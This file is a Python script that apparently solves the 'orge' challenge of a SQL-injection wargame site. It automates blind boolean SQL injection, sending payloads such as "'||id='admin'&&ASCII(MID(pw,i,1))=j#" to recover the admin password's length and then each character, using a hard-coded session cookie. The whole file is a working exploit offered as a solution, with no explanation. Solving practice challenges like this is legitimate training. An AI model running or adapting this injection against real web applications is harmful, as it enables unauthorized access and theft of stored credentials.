import requests

url ="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}

def GET(params,msg="Hello admin"):
    if requests.get(url,params,cookies=cookie).text.find(msg) > 0:
        return True
    else:
        return False
length = 0
while True:
    if not GET({"pw":f"'||id='admin'&&length(pw)={length}#"}):length+=1
    else:break
pw = ""
for i in range(1,length+1):
    for j in range(30,128):
        if GET({"pw":f"'||id='admin'&&ASCII(MID(pw,{i},1))={j}#"}):pw+=chr(j)
if GET({"pw":pw},"Clear!"):print("[*] Success")
